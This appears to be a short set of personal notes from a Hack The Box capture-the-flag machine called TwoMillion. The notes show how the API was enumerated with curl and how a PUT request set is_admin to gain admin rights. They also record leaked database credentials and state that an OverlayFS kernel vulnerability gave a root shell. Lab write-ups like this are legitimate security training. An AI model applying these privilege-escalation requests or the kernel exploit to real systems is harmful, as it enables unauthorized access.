## TwoMillion Box

Can use javascript console to call loaded function in page like `makeInviteCode()`

cagiko4571@bitofee.com - temp mail
admin123 - password

http://2million.htb/api/v1/user/vpn/generate


cookie: tk5n6qrq4ern206r0a426pd7m6

 curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=tk5n6qrq4ern206r0a426pd7m6" | jq

{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}

curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=tk5n6qrq4ern206r0a426pd7m6" --header "Content-Type: application/json" -d '{"email": "cagiko4571@bitofee.com", "is_admin": '1'}' | jq

curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=tk5n6qrq4ern206r0a426pd7m6" --header "Content-Type: application/json" --data '{"username": "test"}'

DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

OverlayFS vuln for linux kernel popped root shell
